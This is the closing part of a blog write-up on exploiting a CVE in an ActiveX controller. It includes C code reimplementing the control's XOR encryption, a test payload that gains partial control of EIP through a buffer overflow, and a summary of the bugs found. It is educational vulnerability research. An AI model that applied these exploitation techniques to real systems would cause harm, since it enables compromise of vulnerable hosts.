</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">realbuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sprintf</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">&#34;%02hhX&#34;</span><span class="p">,</span> <span class="n">newbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">realbuf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>To sum up, a function takes a <strong>previous key value</strong> as parameter and <strong>generates from it a new key</strong> with a lot of <strong>xor</strong> operations. Then, my <strong>realm</strong> value&rsquo;s 8 bytes are <strong>xored with this key</strong> and the result of it is <strong>stored as the new key</strong> (for example, if the key is <strong>0x4141414142424242</strong>, and my value is <strong>0x4343434344444444</strong>, then the xor result of these two values is stored as a <strong>seed to generate the next key</strong>, that&rsquo;s why <strong>modifying the first 8 bytes generates a completely new string</strong>).</p>
<p>Then at last, a <strong>sprintf</strong> with <strong>%02hhX</strong> format is called on each of the resulting byte, and <strong>the result of it is stored in a new buffer</strong>: <strong>0x02hhX</strong> will simply store the <strong>base 16</strong> (hexadecimal) version of a character and <strong>store it as string</strong> (that&rsquo;s important) in a new location.</p>
<p>For example, if through the encryption process I get the byte <strong>0x42</strong>, then &ldquo;<strong>42</strong>&rdquo; will be stored at the new location, which means two bytes &ldquo;<strong>\x34\x32</strong>&rdquo; will be stored from one byte &ldquo;<strong>\x42</strong>&rdquo;.</p>
<p>Do you follow? Take the time to <strong>re-read</strong> that if it isn&rsquo;t clear, because I know this part might get confusing.</p>
</div>
        </div>
    </div>
<p><strong>A buffer overflow occured from that new location</strong>, the ciphertext (for which the size is the double of the initial <strong>realm</strong> string size) overflowed on the <strong>saved EIP</strong> and I thought I could control the execution flow there.</p>
<p>So I locally tried to generate an entry that would produce &ldquo;<strong>0x41414141</strong>&rdquo; (thanks to the fact that I have re-developed <strong>the whole encryption process in C</strong>) as the 4 end bytes of the ciphertext (which means, the encrypted string before calling sprintf must end with &ldquo;<strong>\xAA\xAA</strong>&rdquo;).</p>
<p>By testing, I managed to get a string that fullfilled this condition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./a.out <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;B&#34;*132 + &#34;\x43\x90&#34;&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">D53A83F267BDD08BB10EA219AF391520ACA353B1DFD6F71E2D5E22D7A54F07653D07AEF2C302B894
</span></span><span class="line"><span class="cl">05F546E7616043E7D92888B3653936BBEC535AF524F297F15AEDB569E0CCC45AF9C76FEF44D4F823
</span></span><span class="line"><span class="cl">3896F5D0DEA7861C7E0C0ED1A0095D04F9EFE876EE60AAE2F43DA643B766C950F7AAF4148DD09E13
</span></span><span class="line"><span class="cl">3CCAF8EFDA95CFDA49177C2EAAAA
</span></span></code></pre></div><p>Theoretically, by entering <strong>132 &ldquo;B&rdquo;</strong> followed by <strong>&quot;\x43\x90&quot;</strong> as <strong>realm</strong> parameter would result in an EIP register equal to <strong>0x41414141</strong>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/eip_control_2.png"
        data-srcset="/activex/eip_control_2.png, /activex/eip_control_2.png 1.5x, /activex/eip_control_2.png 2x"
        data-sizes="auto"
        alt="/activex/eip_control_2.png"
        title="EIP Control 2" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Indeed, it worked.</div>
        </div>
    </div>
<p>But <strong>I got blocked here</strong> because there was no way for me to get values like &ldquo;<strong>0x01414141</strong>&rdquo; or &ldquo;<strong>0x02424242</strong>&rdquo; because neither <strong>0x02</strong> nor <strong>0x01</strong> are part of the <strong>values that can be returned by sprintf</strong> with <strong>0x02hhX</strong> formatting, because <strong>what is returned is the hexadecimal form of a character</strong> which possibly <strong>can&rsquo;t be 0x01</strong> according to the encryption process.</p>
<p>Well <strong>maybe</strong> it can, maybe this way would succeed somehow but I dropped it when I found out that <strong>a much simpler way</strong> existed by writing a longer payload string (as show earlier in this write-up).</p>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>Here is the end of this post. We saw a lot of things, from <strong>gathering information about a CVE</strong>, to <strong>reverse engineering</strong> and <strong>full exploitation</strong> of an ActiveX controller. We even saw the <strong>potential vulnerable paths</strong> that led to nothing.</p>
<div class="details admonition abstract open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-list-ul fa-fw" aria-hidden="true"></i>Bugs we found<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>By exploiting this CVE, we noticed a lot of bugs in the code of this controller, remember:</p>
<ul>
<li>The <strong>logic bug on the error return status</strong> that let us reach the critical function bypassing all the checks in place.</li>
<li>The <strong>flaw in the bloc by bloc encryption process</strong> of the realm field, that allowed us to partially control the <strong>EIP</strong> register (we could set it to <strong>0x41414141</strong> for POC but couldn&rsquo;t go beyond to set an arbitrary address).</li>
<li>The buffer overflow on a wrongly handled <strong>strcpy</strong> call that simply led to the <strong>full takeover of this controller</strong>.</li>
<li>Other small bugs and code flaws that made this controller generally vulnerable.</li>
</ul></div>
        </div>
    </div>
<p>As you noticed, there are a <strong>lot of elements</strong> in such big programs, and a lot of attack vectors, through <strong>network</strong>, <strong>encryption processes</strong>, and so on. Keep in mind that by looking further and spending more time, maybe I would have found <strong>other vulnerabilities</strong> leading to the same result.</p>
<p>Every system is vulnerable at some point, if we take time to <strong>inspect everything</strong> and try to <strong>think out of the box</strong>, like I did for the logic bug in the checking function.</p>
<p>I hope you liked this post and that you learnt some new things.</p>
<p>Thanks for reading.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-05-29</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://ech0.re/posts/active-x-exploitation/" data-title="Write-up: ActiveX controller exploitation" data-via="ech0fr" data-hashtags="windows,exploit,write-up,cve"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://ech0.re/posts/active-x-exploitation/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://ech0.re/posts/active-x-exploitation/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/exploit/">Exploit</a>,&nbsp;<a href="/tags/write-up/">Write-Up</a>,&nbsp;<a href="/tags/cve/">Cve</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/how-to-start/" class="prev" rel="prev" title="How to start in cybersecurity"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>How to start in cybersecurity</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://ech0.re" target="_blank">Ech0</a></span>&nbsp;|&nbsp;<span class="license">me@ech0.re | <a href='/privacy/'>Privacy</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
